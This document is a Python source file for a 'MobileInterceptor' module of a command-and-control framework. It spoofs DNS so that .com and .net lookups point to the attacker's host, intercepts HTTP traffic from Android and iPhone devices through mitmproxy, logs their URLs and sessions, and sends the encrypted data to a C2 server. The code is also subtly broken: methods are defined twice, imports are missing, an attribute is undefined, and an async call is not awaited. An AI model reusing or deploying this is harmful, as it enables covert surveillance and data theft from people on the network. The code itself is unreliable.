import scapy.all as scapy
import mitmproxy
from mitmproxy import http
from scapy.layers.http import HTTPRequest
from scapy.layers.dns import DNS
import netifaces as ni
import psutil
import json
import logging
import threading
from cryptography.fernet import Fernet
from datetime import datetime
import os
from device_connection import DeviceConnectionManager
from database.database import DatabaseManager


# Use existing logger from c2_server
logger = logging.getLogger('C2Server')

class MobileInterceptor:
    def __init__(self, interface='eth0', server_key=None):
        """Initialize mobile interceptor"""
        self.interface = interface
        self.server_key = server_key
        self.logger = logging.getLogger(__name__)
        self.running = False
        
        # Get interface information
        try:
            if_addrs = ni.ifaddresses(self.interface)
            self.ip = if_addrs[ni.AF_INET][0]['addr'] if ni.AF_INET in if_addrs else '127.0.0.1'
            self.mac = if_addrs[ni.AF_LINK][0]['addr'] if ni.AF_LINK in if_addrs else '00:00:00:00:00:00'
        except Exception as e:
            logger.error(f"Error getting interface information: {str(e)}")
            self.ip = '127.0.0.1'
            self.mac = '00:00:00:00:00:00'
            raise Exception(f"Failed to get interface information: {str(e)}")
        
        # Initialize C2 server connection and database
        self.c2_server = None
        self.db_manager = DatabaseManager()
        self.fernet = Fernet(server_key) if server_key else None
        self.captured_packets = []
        self.device_info = {}
        self.active_sessions = {}
        self._shutdown = False

    async def initialize_device(self):
        """Initialize device connection and database"""
        try:
            async with DeviceConnectionManager() as self.c2_server:
                await self.c2_server.initialize_device('mobile_interceptor', self.ip)
            await self.db_manager.ensure_initialized()
        except Exception as e:
            logger.error(f"Failed to initialize mobile interceptor: {str(e)}")
            raise
        
        try:
            await self.db_manager.initialize_database()
        except Exception as e:
            logger.error(f"Failed to initialize database: {str(e)}")
            raise

    async def initialize_device(self):
        """Initialize device connection and database"""
        try:
            async with DeviceConnectionManager() as self.c2_server:
                await self.c2_server.initialize_device('mobile_interceptor', self.ip)
        except Exception as e:
            logger.error(f"Failed to initialize C2 server connection: {str(e)}")
            raise
        
        try:
            self.db_manager = DatabaseManager()
            await self.db_manager.initialize_database()
        except Exception as e:
            logger.error(f"Failed to initialize database: {str(e)}")
            raise
        
    async def start_interception(self):
        try:
            self.db_manager = DatabaseManager()
            self.db_manager.initialize_database()
        except Exception as e:
            logger.error(f"Failed to initialize database: {str(e)}")
            raise
        
    def start_interception(self):
        """Start mobile traffic interception"""
        logger.info(f"Starting mobile interception on interface {self.interface}")
        
        try:
            # Initialize encryption
            self.fernet = Fernet(self.security_config.encryption.key.encode())
        except Exception as e:
            logger.error(f"Failed to initialize encryption: {str(e)}")
            raise
        
        # Start DNS spoofing
        try:
            threading.Thread(target=self.dns_spoof, daemon=True).start()
        except Exception as e:
            logger.error(f"Failed to start DNS spoofing: {str(e)}")
            raise
        
        # Start HTTP interception
        try:
            threading.Thread(target=self.http_intercept, daemon=True).start()
        except Exception as e:
            logger.error(f"Failed to start HTTP interception: {str(e)}")
            raise
        
        # Start packet capture
        try:
            threading.Thread(target=self.packet_capture, daemon=True).start()
        except Exception as e:
            logger.error(f"Failed to start packet capture: {str(e)}")
            raise
        
    def dns_spoof(self):
        """DNS spoofing for mobile traffic"""
        while True:
            try:
                def spoof_dns(packet):
                    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
                        # Check if this is a DNS request
                        queried_host = packet[DNS].qd.qname.decode()
                        
                        # Add your DNS spoofing rules here
                        if queried_host.endswith('.com') or queried_host.endswith('.net'):
                            # Spoof the DNS response
                            spoofed_packet = scapy.IP(dst=packet[scapy.IP].src, 
                                                    src=packet[scapy.IP].dst)/\
                                            scapy.UDP(dport=packet[scapy.UDP].sport, 
                                                    sport=packet[scapy.UDP].dport)/\
                                            DNS(id=packet[DNS].id, 
                                                qr=1, 
                                                aa=1, 
                                                qd=packet[DNS].qd,
                                                an=DNSRR(rrname=packet[DNS].qd.qname,
                                                        ttl=10,
                                                        rdata=self.ip))
                            
                            scapy.send(spoofed_packet, verbose=0)
                            logging.info(f"Spoofed DNS response for {queried_host}")
                
                # Start sniffing for DNS packets
                scapy.sniff(filter="udp port 53", prn=spoof_dns)
                
            except Exception as e:
                logging.error(f"DNS spoofing error: {str(e)}")
                time.sleep(5)

    def http_intercept(self):
        """HTTP/HTTPS interception using mitmproxy"""
        class MobileInterceptorAddon(mitmproxy.addons.Addon):
            def request(self, flow: http.HTTPFlow) -> None:
                try:
                    # Extract device information from User-Agent
                    user_agent = flow.request.headers.get('User-Agent', '')
                    if 'Android' in user_agent or 'iPhone' in user_agent:
                        device_info = {
                            'timestamp': datetime.now().isoformat(),
                            'ip': flow.client_conn.address[0],
                            'user_agent': user_agent,
                            'url': flow.request.url,
                            'method': flow.request.method
                        }
                        
                        # Track active sessions
                        if flow.client_conn.address[0] not in self.active_sessions:
                            self.active_sessions[flow.client_conn.address[0]] = {
                                'device_info': device_info,
                                'last_seen': datetime.now().isoformat(),
                                'requests': []
                            }
                        
                        self.active_sessions[flow.client_conn.address[0]]['requests'].append(device_info)
                        
                        # Encrypt and send to C2 server if key is available
                        if self.fernet:
                            encrypted_data = self.fernet.encrypt(json.dumps(device_info).encode())
                            self.send_to_c2(encrypted_data)
                            
                except Exception as e:
                    logging.error(f"HTTP interception error: {str(e)}")
        
        # Start mitmproxy with our addon
        addons = [MobileInterceptorAddon()]
        mitmproxy.options.Options()
        mitmproxy.master.Master(mitmproxy.options.Options(), addons=addons)

    def packet_capture(self):
        """Capture and analyze mobile traffic"""
        try:
            def analyze_packet(packet):
                if packet.haslayer(scapy.IP):
                    try:
                        src_ip = packet[scapy.IP].src
                        dst_ip = packet[scapy.IP].dst
                        
                        # Check if this is mobile traffic
                        if self.is_mobile_traffic(packet):
                            packet_info = {
                                'timestamp': datetime.now().isoformat(),
                                'src_ip': src_ip,
                                'dst_ip': dst_ip,
                                'protocol': packet[scapy.IP].proto,
                                'length': len(packet)
                            }
                            
                            # Limit packet storage to prevent memory leaks
                            self.captured_packets.append(packet_info)
                            if len(self.captured_packets) > 1000:
                                self.captured_packets.pop(0)
                            
                            # Send to C2 server if key is available
                            if self.fernet:
                                encrypted_data = self.fernet.encrypt(json.dumps(packet_info).encode())
                                # Use asyncio to handle async operations
                                asyncio.run(self.send_to_c2(encrypted_data))
                    except Exception as e:
                        logger.error(f"Error processing packet: {str(e)}")
            
            # Start sniffing for mobile traffic
            scapy.sniff(
                iface=self.interface, 
                prn=analyze_packet,
                store=False,  # Don't store packets in memory
                timeout=300  # 5 minute timeout
            )
            
        except Exception as e:
            logger.error(f"Packet capture error: {str(e)}")
            time.sleep(5)
        finally:
            # Cleanup resources
            self.captured_packets.clear()
            logger.info("Packet capture stopped")

    def is_mobile_traffic(self, packet):
        """Determine if packet is likely from a mobile device"""
        try:
            # Check for common mobile ports
            mobile_ports = [80, 443, 53, 8080]
            
            if packet.haslayer(scapy.TCP):
                if packet[scapy.TCP].dport in mobile_ports or packet[scapy.TCP].sport in mobile_ports:
                    return True
            
            if packet.haslayer(scapy.UDP):
                if packet[scapy.UDP].dport in mobile_ports or packet[scapy.UDP].sport in mobile_ports:
                    return True
            
            return False
        except:
            return False

    async def send_to_c2(self, data):
        """Send intercepted data to C2 server"""
        try:
            # Encrypt data using security config
            encrypted_data = self.fernet.encrypt(data)
            
            # Send to C2 server
            await self.c2_server.send_data(encrypted_data)
            
            # Store in database
            self.db_manager.store_intercepted_data({
                'timestamp': datetime.now().isoformat(),
                'data': data.decode(),
                'device_type': 'mobile'
            })
            
        except Exception as e:
            logging.error(f"Error sending to C2: {str(e)}")

    def get_device_info(self):
        """Get information about connected mobile devices"""
        return self.device_info

    def get_active_sessions(self):
        """Get active mobile sessions"""
        return self.active_sessions

    def get_network_stats(self):
        """Get network statistics"""
        stats = {
            'total_packets': len(self.captured_packets),
            'active_sessions': len(self.active_sessions),
            'memory_usage': psutil.Process().memory_info().rss / 1024 / 1024,
            'cpu_usage': psutil.cpu_percent(interval=1)
        }
        return stats

if __name__ == '__main__':
    # Example usage
    interceptor = MobileInterceptor(interface='eth0')
    try:
        asyncio.run(interceptor.start_interception())
    except KeyboardInterrupt:
        logging.info("Mobile interceptor stopped")
